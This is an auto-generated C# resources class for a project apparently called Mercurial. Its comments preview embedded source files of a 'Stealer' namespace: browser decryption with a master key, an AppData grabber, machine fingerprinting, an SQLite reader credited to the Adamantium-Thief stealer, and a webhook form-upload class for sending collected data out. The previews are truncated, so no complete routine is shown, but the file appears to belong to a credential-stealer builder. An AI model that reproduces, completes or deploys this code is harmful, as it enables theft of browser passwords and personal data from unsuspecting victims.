﻿//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Mercurial.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Mercurial.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.Runtime.InteropServices;
        ///using System.Security.Cryptography;
        ///using System.Text;
        ///
        ///
        ///namespace Stealer
        ///{
        ///    //Credits: https://github.com/dvsekhvalnov/jose-jwt
        ///    class AesGcm
        ///    {
        ///        public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
        ///        {
        ///            IntPtr hAlg = OpenAlgorithmProvider(BCrypt.BCRYPT_AES_ALGORITHM, BCrypt.MS_PRIMITIVE_PROVIDER, BCrypt.BCRYPT_CHAIN_MODE_GCM);
        ///            IntPtr hKey, keyDataBuffer = I [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string AesGcm {
            get {
                return ResourceManager.GetString("AesGcm", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.Collections.Generic;
        ///using System.Text;
        ///using System.Runtime.InteropServices;
        ///using System.Security.Cryptography;
        ///
        ///namespace Stealer
        ///{
        ///    public static class BCrypt
        ///    {
        ///        public const uint ERROR_SUCCESS = 0x00000000;
        ///        public const uint BCRYPT_PAD_PSS = 8;
        ///        public const uint BCRYPT_PAD_OAEP = 4;
        ///
        ///        public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(0x4d42444b);
        ///
        ///        public static readonly string BCRYPT_O [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string BCrypt {
            get {
                return ResourceManager.GetString("BCrypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.Text;
        ///
        ///using System.IO;
        ///using System.Security.Cryptography;
        ///namespace Stealer
        ///{
        ///    class Browser
        ///    {
        ///        private static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
        ///        {
        ///            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; 
        ///
        ///            
        ///            Array.Copy(encryptedData, 3, iv, 0, 12);
        ///
        ///            try
        ///            {
        ///                
        ///                byte[] Buffer = new byte[encryptedData.Length - 15];
        ///       [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Browser {
            get {
                return ResourceManager.GetString("Browser", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.Collections.Generic;
        ///using System.Linq;
        ///using System.Text;
        ///using System.Threading.Tasks;
        ///using System.Text.RegularExpressions;
        ///using System.Net.Http;
        ///using System.Net;
        ///using System.IO;
        ///namespace Stealer
        ///{
        ///    class Common
        ///    {
        ///        static int fileCounter = 1;
        ///        public static string fileName = String.Empty;
        ///
        ///        public static string Extract(string target, string content)
        ///        {
        ///            string output = String.Empty;
        ///            Regex rx = new  [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Common {
            get {
                return ResourceManager.GetString("Common", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.Collections.Generic;
        ///using System.Linq;
        ///using System.Text;
        ///using System.Threading.Tasks;
        ///using System.Text.RegularExpressions;
        ///using System.IO;
        ///using System.Net.Http;
        ///
        ///namespace Stealer
        ///{
        ///    class Grabber
        ///    {
        ///        public static List&lt;string&gt; target = new List&lt;string&gt;();
        ///
        ///        private static void Scan()
        ///        {
        ///            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        ///            string local = Environment.GetFold [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Grabber {
            get {
                return ResourceManager.GetString("Grabber", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.Management;   
        ///using Microsoft.Win32;
        ///using System.IO;
        ///namespace Stealer
        ///{
        ///    class Machine
        ///    {
        ///        static readonly string[] SizeSuffixes = { &quot;bytes&quot;, &quot;KB&quot;, &quot;MB&quot;, &quot;GB&quot;, &quot;TB&quot;, &quot;PB&quot;, &quot;EB&quot;, &quot;ZB&quot;, &quot;YB&quot; };
        ///
        ///        public string osName = String.Empty;
        ///        public string osArchitecture = String.Empty;
        ///        public string osVersion = String.Empty;
        ///        public string processName = String.Empty;
        ///        public string gpuVideo = String.Empty;
        ///        public str [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Machine {
            get {
                return ResourceManager.GetString("Machine", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.Collections.Generic;
        ///using System.Linq;
        ///using System.Text;
        ///using System.Threading.Tasks;
        ///using System.Threading;
        ///using System.IO;
        ///using System.Text.RegularExpressions;
        ///using System.Drawing;
        ///using System.Drawing.Imaging; 
        ///using System.Windows.Forms; 
        ///using System.Net.Http;
        ///using System.Net;
        ///using System.Diagnostics;
        ///using Microsoft.Win32;
        ///using System.Runtime.InteropServices;
        ///
        ///namespace Stealer
        ///{
        ///    class Program
        ///    {
        ///        [DllImport(&quot;kernel32.dll&quot;)]
        ///     [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Program {
            get {
                return ResourceManager.GetString("Program", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.IO;
        ///using System.Text;
        ///
        /////Credits: https://github.com/LimerBoy/Adamantium-Thief/blob/master/Stealer/Stealer/modules/SQLite.cs
        ///
        ///namespace Stealer
        ///{
        ///    internal class SQLite
        ///    {
        ///        private readonly byte[] _sqlDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
        ///        private readonly ulong _dbEncoding;
        ///        private readonly byte[] _fileBytes;
        ///        private readonly ulong _pageSize;
        ///        private string[] _fieldNames;
        ///        private SqliteMas [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string SQLite {
            get {
                return ResourceManager.GetString("SQLite", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.Collections.Generic;
        ///using System.Linq;
        ///using System.Text;
        ///using System.Threading.Tasks;
        ///using System.Net.Http;
        ///using System.Net;
        ///using System.IO;
        ///
        ///namespace Stealer
        ///{
        ///    class User
        ///    {
        ///        public static string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        ///        public static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        ///        public static string tempFolder = Environment [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string User {
            get {
                return ResourceManager.GetString("User", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.Collections.Generic;
        ///using System.Linq;
        ///using System.Text;
        ///using System.Threading.Tasks;
        ///using System.Net.Http;
        ///using System.Net;
        ///using System.IO;
        ///
        ///namespace Stealer
        ///{
        ///    public static class FormUpload
        ///    {
        ///        private static readonly Encoding encoding = Encoding.UTF8;
        ///        public static HttpWebResponse MultipartFormDataPost(string postUrl, string userAgent, Dictionary&lt;string, object&gt; postParameters)
        ///        {
        ///            string formDataBoundary = String.F [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Webhook {
            get {
                return ResourceManager.GetString("Webhook", resourceCulture);
            }
        }
    }
}